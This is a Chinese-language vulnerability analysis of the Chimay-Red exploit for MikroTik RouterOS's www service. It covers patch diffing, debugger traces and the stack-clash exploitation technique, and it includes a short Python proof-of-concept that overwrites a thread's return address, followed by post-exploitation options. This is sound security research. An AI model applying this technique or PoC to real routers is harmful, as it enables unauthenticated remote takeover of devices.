> 原文链接: https://www.anquanke.com//post/id/200087 


# Mikrotik Chimay-Red 分析


                                阅读量   
                                **692166**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t01ea886630472ebf32.jpg)](https://p2.ssl.qhimg.com/t01ea886630472ebf32.jpg)



## 前言

`Chimay-Red`是针对`MikroTik RouterOs`中`www`程序存在的一个漏洞的利用工具，该工具在泄露的`Vault 7`文件中提及。利用该工具，在无需认证的前提下可在受影响的设备上实现远程代码执行，从而获取设备的控制权。该漏洞本质上是一个整数溢出漏洞，对漏洞的利用则通过堆叠远程多线程栈空间的思路完成。更多信息可参考博客[Chimay-Red](https://blog.seekintoo.com/chimay-red/)。

下面结合已有的漏洞利用脚本[Chimay-Red](https://github.com/BigNerd95/Chimay-Red)，对该漏洞的形成原因及利用思路进行分析。



## 环境准备

`MikroTik`官方提供了多种格式的镜像，可以利用`.iso`和`.vmdk`格式的镜像，结合`VMware`虚拟机来搭建仿真环境。具体的步骤可参考文章 [Make It Rain with MikroTik](https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6) 和 [Finding and exploiting CVE-2018–7445](https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1)，这里不再赘述。

根据`MikroTik`官方的公告，该漏洞在`6.38.5`及之后的版本中进行了修复，这里选取以下镜像版本进行分析。
<li>
`6.38.4`，`x86`架构，用于进行漏洞分析</li>
<li>
`6.38.5`，`x86`架构，用于进行补丁分析</li>
搭建起仿真环境后，还需要想办法获取设备的`root shell`，便于后续的分析与调试。参考议题`《Bug Hunting in RouterOS》`，获取`root shell`的方法如下：
1. 通过挂载`vmdk`并对其进行修改：在`/rw/pckg`目录下新建一个指向`/`的符号链接(`ln -s / .hidden`)
1. 重启虚拟机后，以`ftp`方式登录设备，切换到`/`路径(`cd .hidden`)，在`/flash/nova/etc`路径下新建一个`devel-login`目录
<li>以`telnet`方式登录设备(`devel/&lt;admin账户的密码&gt;`)，即可获取设备的`root shell`
</li>


## 漏洞定位

借助`bindiff`工具对两个版本中的`www`程序进行比对，匹配结果中相似度较低的函数如下。

[![](https://p1.ssl.qhimg.com/dm/1024_123_/t017072d17811d9340a.png)](https://p1.ssl.qhimg.com/dm/1024_123_/t017072d17811d9340a.png)

逐个对存在差异的函数进行分析，结合已知的漏洞信息，确定漏洞存在于`Request::readPostDate()`函数中，函数控制流图对比如下。

[![](https://p5.ssl.qhimg.com/t01e5bf53b5cd98ac63.png)](https://p5.ssl.qhimg.com/t01e5bf53b5cd98ac63.png)

`6.38.4`版本中`Request::readPostDate()`函数的部分伪代码如下，其主要逻辑是：获取请求头中`content-length`的值，根据该值分配对应的栈空间，然后再从请求体中读取对应长度的内容到分配的缓冲区中。由于`content-length`的值外部可控，且缺乏有效的校验，显然会存在问题。

```
char Request::readPostData(Request *this, string *a2, unsigned int a3)
`{`
  // ...
  v9 = 0;
  string::string((string *)&amp;v8, "content-length");
  v3 = Headers::getHeader((Headers *)this, (const string *)&amp;v8, &amp;v9);
  // ...
  if ( !v3 || a3 &amp;&amp; a3 &lt; v9 )    // jsproxy.p中, 传入的参数a3为0
    return 0;
  v4 = alloca(v9 + 1);
  v5 = (_DWORD *)istream::read((istream *)(this + 8), (char *)&amp;v7, v9);
  // ...
`}`
```



## 漏洞分析

通过对`www`程序进行分析，针对每个新的连接，其会生成一个新线程来进行处理，而每个线程的栈空间大小为`0x20000`。

```
// main()
stacksize = 0;
pthread_attr_init(&amp;threadAttr);
pthread_attr_setstacksize(&amp;threadAttr, 0x20000u);    // 设置线程栈空间大小
pthread_attr_getstacksize(&amp;threadAttr, &amp;stacksize);

// Looper::scheduleJob()
pthread_cond_init((pthread_cond_t *)(v6 + 4), 0);
if ( !pthread_create((pthread_t *)v6, &amp;threadAttr, start_routine, v6) ) `{``}`
```

`www`进程拥有自己的栈，创建的线程也会拥有自己的栈和寄存器，而`heap`、`code`等部分则是共享的。那各个线程的栈空间是从哪里分配的呢? 简单地讲，进程在创建线程时，线程的栈空间是通过`mmap(MAP_ANONYMOUS|MAP_STACK)`来分配的。同时，多个线程的栈空间在内存空间中是相邻的。

> Stack space for a new thread is created by the parent thread with `mmap(MAP_ANONYMOUS|MAP_STACK)`. So they’re in the “memory map segment”, as your diagram labels it. It can end up anywhere that a large `malloc()` could go. (glibc `malloc(3)` uses `mmap(MAP_ANONYMOUS)` for large allocations.) ([来源](https://stackoverflow.com/questions/44858528/where-are-the-stacks-for-the-other-threads-located-in-a-process-virtual-address))

结合上述知识，当`content-length`的值过小(为负数)或过大时，都会存在问题，下面分别对这2种情形进行分析。

### <a class="reference-link" name="content-length%E7%9A%84%E5%80%BC%E8%BF%87%E5%B0%8F(%E4%B8%BA%E8%B4%9F%E6%95%B0)"></a>content-length的值过小(为负数)

以`content-length=-1`为例，设置相应的断点后，构造数据包并发送。命中断点后查看对应的栈空间，可以看到，进程栈空间的起始范围为`0x7fc20000~0x7fc41000`，而当前线程栈空间的起始范围为`0x774ea000~0x77509000`，夹杂在映射的`lib`库中间。

```
pwndbg&gt; i threads
  Id   Target Id         Frame
  1    Thread 286.286 "www" 0x77513f64 in poll () from target:/lib/libc.so.0
* 2    Thread 286.350 "www" 0x08055a53 in Request::readPostData(string&amp;, unsigned int)
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x805c000 r-xp    14000 0      /nova/bin/www
// ...
 0x805d000  0x8069000 rw-p     c000 0      [heap]
0x774d7000 0x774db000 r-xp     4000 0      /lib/libucrypto.so
// ...
0x774e9000 0x774ea000 ---p     1000 0
0x774ea000 0x77509000 rw-p    1f000 0      &lt;=== 当前线程的栈空间
0x77509000 0x7750a000 r--p     1000 0      /nova/etc/www/system.x3
// ...
0x7fc20000 0x7fc41000 rw-p    21000 0      [stack]
0xffffe000 0xfffff000 r-xp     1000 0      [vdso]
pwndbg&gt; xinfo esp
Extended information for virtual address 0x77508180:

  Containing mapping:
0x774ea000 0x77509000 rw-p    1f000 0

  Offset information:
         Mapped Area 0x77508180 = 0x774ea000 + 0x1e180
```

对应断点处的代码如下，其中`alloca()`变成了对应的内联汇编代码。

```
pwndbg&gt; x/12i $eip
=&gt; 0x8055a53    mov    edx,DWORD PTR [ebp-0x1c]        // 保存的是content-length的值
   0x8055a56     lea    eax,[edx+0x10]    // 以下3行为与alloca()对应的汇编代码
   0x8055a59    and    eax,0xfffffff0                
   0x8055a5c    sub    esp,eax        // 计算后的eax为0,故esp不变
   0x8055a5e    mov    edi,esp
   0x8055a60    push   eax
   0x8055a61    push   edx            // content-length的值, 为-1
   0x8055a62    push   edi
   0x8055a63    mov    eax,DWORD PTR [ebp+0x8]
   0x8055a66    lea    esi,[eax+0x20]
   0x8055a69    push   esi
   0x8055a6a    call   0x8050c40    // istream::read(char *,uint)
```

由于`content-length=-1`，调用`alloca()`后栈空间未进行调整，之后在调用`istream::read()`时，由于传入的`size`参数为`-1`(即`0xffffffff`)，继续执行时会报错。

```
pwndbg&gt; c                                                                                 
Thread 2 "www" received signal SIGSEGV, Segmentation fault.                               
0x77569e0e in streambuf::xsgetn(char*, unsigned int) () from target:/lib/libuc++.so       
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                         
──────────────────────────[ REGISTERS ]──────────────────────────   
*EDI  0x77509000 ◂— 0x75e                                                                 
*ESI  0x8065ca7 ◂— 0x6168c08                                                             
──────────────────────────[ DISASM ]────────────────────────────
 ► 0x77569e0e    rep movsb byte ptr es:[edi], byte ptr [esi]
```

在崩溃点`0x77569e90`处，`edi`的值为`0x77509000`，由于其指向的地址空间不可写，故出现`Segmentation fault`。

```
0x774ea000 0x77509000 rw-p    1f000 0      &lt;=== 当前线程的栈空间
0x77509000 0x7750a000 r--p     1000 0      /nova/etc/www/system.x3
```

注意到在调用`istream::read()`时，传入的第一个参数为当前的栈指针`esp`(其指向的空间用于保存读取的内容)，在读取的过程中会覆盖栈上的内容，当然也包括返回地址(如执行完`Request::readPostData()`后的返回地址)。

```
pwndbg&gt; x/wx $esp
0x77508180:     0x77508208
pwndbg&gt; x/4wx $ebp
0x775081a8:     0x77508238      0x774e0e69 &lt;===返回地址      0x77508328      0x775081f4
```

因此，有没有可能在这个过程中进行利用呢? 如果想要进行利用，大概需要满足如下条件。
<li>
`content-length`的值在`0x7ffffff0~0xffffffff`范围内 (使线程的栈空间向高地址方向增长)</li>
- 在调用`istream::read()`时，在读取请求体中的部分数据后，能使其提前返回
由于`x00`不会影响`istream::read()`，而只有当读到文件末尾时才会提前结束，否则会一直读取直到读取完指定大小的数据。在测试时发现，无法满足上述条件，因此在这个过程中没法利用。

> `Chimay-Red`中通过关闭套接字的方式使`istream::read()`提前返回，但并没有读取请求体中的数据。如果有其他的方式，欢迎交流:)

### <a class="reference-link" name="content-length%E7%9A%84%E5%80%BC%E8%BF%87%E5%A4%A7"></a>content-length的值过大

根据前面可知，当`content-length`的值过大时(`&gt;0x20000`)，在`Request::readPostData()`中，会对线程的栈空间进行调整，使得当前线程栈指针`esp`“溢出”(即指向与当前线程栈空间相邻的低地址区域)。同样在执行后续指令时，由于`esp`指向的某些地址空间不可写，也会出现`Segmentation fault`。

```
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x805c000 r-xp    14000 0      /nova/bin/www
 0x805c000  0x805d000 rw-p     1000 14000  /nova/bin/www
 0x805d000  0x8069000 rw-p     c000 0      [heap]
0x774d7000 0x774db000 r-xp     4000 0      /lib/libucrypto.so
0x774db000 0x774dc000 rw-p     1000 3000   /lib/libucrypto.so
0x774dc000 0x774e6000 r-xp     a000 0      /nova/lib/www/jsproxy.p
0x774e6000 0x774e7000 rw-p     1000 a000   /nova/lib/www/jsproxy.p    (使esp"溢出"到这里)
0x774e9000 0x774ea000 ---p     1000 0
0x774ea000 0x77509000 rw-p    1f000 0       &lt;=== 当前线程的栈空间
0x77509000 0x7750a000 r--p     1000 0      /nova/etc/www/system.x3
```

在这个过程中是否可以进行利用呢? 通过向低地址方向调整当前线程的`esp`指针，比如使其溢出到`0x774e6000 ~0x774e7000`，然后再修改某些地址处的内容，但还是无法使得`istream::read()`在读取部分内容后提前返回，同样会出现类似的错误。



## 漏洞利用

`Chimay-Red`中通过堆叠两个线程栈空间的方式完成了漏洞利用。前面提到，针对每个新的连接，都会创建一个新的线程进行处理，而新创建的线程会拥有自己的栈空间，其大小为`0x20000`。同时，多个线程的栈空间在地址上是相邻的，起始地址间隔为`0x20000`。如果能够使某个线程的栈指针`esp`“下溢”到其他线程的栈空间内，由于栈空间内会包含返回地址等，便可以通过构造payload覆盖对应的返回地址，从而实现劫持程序控制流的目的。下面对该思路进行具体分析。

首先，与服务`www`建立两个连接，创建的两个线程的栈空间初始状态如下。

[![](https://p2.ssl.qhimg.com/dm/1024_458_/t01944a3d82c277a162.png)](https://p2.ssl.qhimg.com/dm/1024_458_/t01944a3d82c277a162.png)

然后，`client1`发送`HTTP`请求头，其中`content-length`的值为`0x20900`。在对应的`thread1`中，先对当前栈指针`esp`进行调整，然后调用`istream::read()`读取请求体数据，对应的栈空间状态如下。由于此时还未发送`HTTP`请求体，因此`thread1`在某处等待。

[![](https://p3.ssl.qhimg.com/dm/1024_456_/t01427c58632852597e.png)](https://p3.ssl.qhimg.com/dm/1024_456_/t01427c58632852597e.png)

同样，`client2`发送`HTTP`请求头，其中`content-length`的值为`0x200`。类似地，在对应的`thread2`中，先对当前栈指针`esp`进行调整，然后调用`istream::read()`读取请求体数据，对应的栈空间状态如下。由于此时还未发送`HTTP`请求体，`thread2`也在某处等待。

[![](https://p2.ssl.qhimg.com/dm/1024_456_/t01a067e9b3f7f0910e.png)](https://p2.ssl.qhimg.com/dm/1024_456_/t01a067e9b3f7f0910e.png)

之后，`client1`发送`HTTP`请求体，在`thread1`中读取发送的数据，并将其保存在`thread1`的`esp(1)`指向的内存空间中。当发送的数据长度足够长时，保存的内容将覆盖`thread2`栈上的内容，包括函数指针、返回地址等。例如当长度为`0x20910-0x210-0x14`时，将覆盖函数`istream::read()`执行完后的返回地址。实际上，当`thread2`执行`istream::read()`时，对应的栈指针`esp(2)`将继续下调，以便为函数开辟栈帧。同时由于函数`isteam::read()`内会调用其他函数，因此也会有其他的返回地址保存在栈上。经过测试，`client1`发送的`HTTP`请求体数据长度超过`0x54c`时，就可以覆盖`thread2`栈上的某个返回地址。

> 在这个例子中，`0x54c` 是通过`cyclic pattern`方式确定的。

[![](https://p5.ssl.qhimg.com/dm/1024_456_/t01516907f5c90351be.png)](https://p5.ssl.qhimg.com/dm/1024_456_/t01516907f5c90351be.png)

此时，`thread2`仍然在等待`client2`的数据，`client2`通过关闭连接，即可使对应的函数返回。由于对应的返回地址已被覆盖，从而达到劫持控制流的目的。

参考`Chimay-Red`工具中的[StackClashPOC.py](https://github.com/BigNerd95/Chimay-Red/blob/master/POCs/StackClashPOC.py)，对应上述流程的代码如下。

```
# 可参考StackClashPOC.py中详细的注释
def stackClash(ip):
    s1 = makeSocket(ip, 80) # client1, thread1
    s2 = makeSocket(ip, 80) # client2, thread2

    socketSend(s1, makeHeader(0x20900)) 
    socketSend(s2, makeHeader(0x200)) 
    socketSend(s1, b'a'*0x54c+ struct.pack('&lt;L', 0x13371337))    # ROP chain address
    s2.close()
```

需要说明的是，`Chimay-Red`工具中的流程与上述流程存在细微的区别，其实质在于`thread1`保存请求体数据的操作与`thread2`为执行`isteam::read()`函数开辟栈空间的操作的先后顺序。

在能够劫持控制流后，后续的利用就比较简单了，常用的思路如下。
- 注入`shellcode`，然后跳转到`shellcode`执行
<li>调用`system()`执行`shell`命令
<ul>
- 当前程序存在`system()`，直接调用即可
<li>当前程序不存在`system()`：寻找合适的`gadgets`，通过修改`got`的方式实现<br><blockquote>`Chimay-Red`工具: 由于`www`程序中存在`dlsym()`，可通过调用`dlsym(0,"system")`的方式查找`system()`</blockquote>
</li>


## 补丁分析

在`6.38.5`版本中对该漏洞进行了修复，对应的`Request::readPostDate()`函数的部分伪代码如下。其中，1) 在调用该函数时，传入的`a3`参数为`0x20000`，因此会对`content-length`的大小进行限制；2) 读取的数据保存在string类型中，即将数据保存在堆上。

```
char Request::readPostData(Request *this, string *a2, unsigned int a3)
`{`
  // ...
  v7 = 0;
  string::string((string *)&amp;v6, "content-length");
  v3 = Headers::getHeader((Headers *)this, (const string *)&amp;v6, &amp;v7);
  if ( v3 )
  `{`
    if ( a3 &gt;= v7 )    // jsproxy.p中, 传入的参数a3为0x20000
    `{`
      string::string((string *)&amp;v6);
      wrap_str_assign(a2, (const string *)&amp;v6);
      string::~string((string *)&amp;v6);
      string::resize(a2, v7, 0);   // 使用sting类型来保存数据
      v5 = istream::read((istream *)(this + 8), (char *)(*(_DWORD *)a2 + 4), v7);
   // ...
```



## 小结
- 漏洞形成的原因为：在获取`HTTP`请求头中`content-length`值后，未对其进行有效校验，造成后续存在整数溢出问题；
<li>
`Chimay-Red`工具中通过堆叠两个线程栈空间的方式完成漏洞利用。</li>


## 相关链接
- [Chimay-Red](https://blog.seekintoo.com/chimay-red/)
- [Chimay-Red: Working POC of Mikrotik exploit from Vault 7 CIA Leaks](https://github.com/BigNerd95/Chimay-Red)
- [Chimay-Red: RouterOS Integer Overflow Analysis](https://www.anquanke.com/post/id/195767)